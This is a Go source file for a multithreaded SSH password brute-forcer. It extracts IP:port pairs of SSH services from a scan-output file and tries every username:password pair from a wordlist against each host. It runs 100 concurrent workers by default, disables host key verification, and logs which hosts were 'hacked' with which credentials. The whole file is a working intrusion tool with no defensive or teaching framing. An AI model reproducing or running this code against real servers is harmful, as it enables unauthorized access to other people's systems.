package main

import (
        "flag"
	"bufio"
	"golang.org/x/crypto/ssh"
	"go-network-tools/utils/log"
	"os"
	"net"
        "io"
        "sync"
        "strings"
        "regexp"
	"fmt"
)

var (
	ipReg   = flag.String("ipgetter", "", "ip getter")
	portReg   = flag.String("portgetter", "", "port getter")
	ipListFile = flag.String("file", "", "ip port list")
	numThread = flag.Int("threads", 100, "num thread to run")
        userpasswdfile = flag.String("userpwfile", "", "user password file")
)

func checkArgs() error {
	if *ipReg == "" || *portReg == "" || *ipListFile == "" {
		return fmt.Errorf("please check args")
	}
	return nil
}

func getUserPassword(file string) [][2]string {
    fi, err := os.Open(file)
    if err != nil {
        panic(err)
    }
    defer fi.Close()
    ret := make([][2]string, 0)
    buf := bufio.NewReader(fi)
    for {
        line, err := buf.ReadString('\n') 
        if err != nil {
            if err == io.EOF { 
                break
            } else { 
                return [][2]string{}
            }
        }
        parts := strings.Split(line, ":")
        if len(parts) == 2 {
           ret = append(ret, [2]string{parts[0], parts[1]})
        }
    }
    return ret
}

func main() {
	defer log.Clean()
	flag.Parse()
	if err:=checkArgs(); err != nil {
		panic(err)
	}
        up := getUserPassword(* userpasswdfile)
	ch := make(chan string, *numThread)
	var wg sync.WaitGroup
        wg.Add(*numThread+1)
        go product(ch, *ipListFile, &wg)
        for i:=0 ;i < *numThread; i++ {
            go work(ch, &wg, up)
        }
        wg.Wait()
}

func product(ch chan string, file string, wg *sync.WaitGroup) {
    defer wg.Done()
    defer close(ch)
	
    fi, err := os.Open(file)
    if err != nil {
        panic(err)
    }
    defer fi.Close()
	
    buf := bufio.NewReader(fi)
    ipGetter := regexp.MustCompile(*ipReg)
    portGetter := regexp.MustCompile(*portReg)
    for {
        line, err := buf.ReadString('\n') 
        if err != nil {
            if err == io.EOF { 
                break
            } else {
                panic("Read file error!") 
            }
        }
        if strings.Contains(line, "SSH") {
             ips := ipGetter.FindStringSubmatch(line)
             ports := portGetter.FindStringSubmatch(line) 
             if len(ips) != 2 || len(ports) != 2 {
                 log.MyLogI("%s parse err\n", line)
                 continue
             } else {
                  ch <- fmt.Sprintf("%s:%s", ips[1], ports[1])
             }
        }
    }
}

func work(ch chan string, wg *sync.WaitGroup, userpw [][2]string) {
     defer wg.Done()
     for {
          find := false
          select {
             case ip_port := <- ch:
                if ip_port == "" {
                    return
                }  
                for _, up := range userpw {
                     //log.MyLogS("start hack %s use %s:%s", ip_port, up[0], up[1])
                     if checkSSHPasswd( ip_port, up[0], up[1]) {
                          log.MyLogI("%s is use user:%s, pw:%s", ip_port, up[0], up[1])
                          find = true
                          break
                      }
                 }
                 if find == false {
                      log.MyLogI("%s cann't be hack", ip_port)
                 }   
         }
     }
}
func checkSSHPasswd(ip_port string,user, password string) bool {
	PassWd := []ssh.AuthMethod{ssh.Password(password)}
	Conf := ssh.ClientConfig{
	    User: user, 
	    Auth: PassWd,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
                return nil
            },
	}
	Client, err := ssh.Dial("tcp", ip_port, &Conf)
	if err != nil {
                fmt.Printf("%s, %s:%s , err:%v\n", ip_port, user, password, err) 
		return false
	}
	defer Client.Close()
	return true
}
